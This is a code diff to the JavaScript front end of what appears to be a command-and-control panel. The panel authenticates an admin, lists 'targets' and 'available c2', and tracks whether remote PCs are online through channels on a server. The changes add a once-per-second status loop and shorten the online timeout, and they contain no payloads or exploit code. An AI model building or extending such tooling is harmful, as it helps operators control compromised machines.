@@ -316,7 +316,9 @@
                 print(`ADMIN AUTHENTICATED: ${user.email}`, "log-sys");
                 print("", "log-info");
                 print("Type '!help' for commands", "log-info");
+                print("Type '!list' for available c2", "log-info");
                 loadTargets();
+                startStatusLoop(); 
             } else {
                 overlay.innerHTML = "⬚ ACCESS DENIED ⬚";
                 setTimeout(() => window.location.href = "login.html", 2500);
@@ -358,7 +360,7 @@
                 const lastSeen = onlineStatus[pc.name]?.last_seen || 0;
                 const timeDiff = Date.now() - lastSeen;
                 
-                const isOnline = timeDiff < 20000; 
+                const isOnline = timeDiff < 10000; 
                 
                 const statusText = isOnline ? "🟢 ONLINE" : "🔴 OFFLINE";
                 const colorClass = isOnline ? "log-num" : "log-err";
@@ -387,6 +389,38 @@
             });
             
             print("Database connection established.", "log-sys");
+        }
+
+        function startStatusLoop() {
+            setInterval(() => {
+                updateTopStatus(currentTargetName);
+            }, 1000); 
+        }
+
+        function updateTopStatus(pcName) {
+            let isOnline = false;
+
+            if (pcName && pcName !== "NONE") {
+                const lastSeen = onlineStatus[pcName]?.last_seen || 0;
+                isOnline = (Date.now() - lastSeen) < 20000;
+            } 
+            else {
+                isOnline = pcArray.some(pc => {
+                    const last = onlineStatus[pc.name]?.last_seen || 0;
+                    return (Date.now() - last) < 20000;
+                });
+            }
+
+            // Update UI
+            if (isOnline) {
+                statusEl.innerHTML = "⬤ ONLINE";
+                statusEl.classList.add("online");
+                statusEl.style.color = "#0eff00";
+            } else {
+                statusEl.innerHTML = "⬤ OFFLINE";
+                statusEl.classList.remove("online");
+                statusEl.style.color = "#ff3333";
+            }
         }
 
 
@@ -486,10 +520,12 @@
                     currentTargetName = selected.name;
                     promptTxt.innerText = `${selected.name}#`;
                     print(`✓ Connected to ${selected.name} (${selected.server})`, "log-sys");
+                    updateTopStatus(selected.name); 
                 } else {
                     print(`✗ Cannot find channel in ${selected.name}`, "log-err");
                 }
                 return;
+
             }
 
             if(cmd === '!status') {
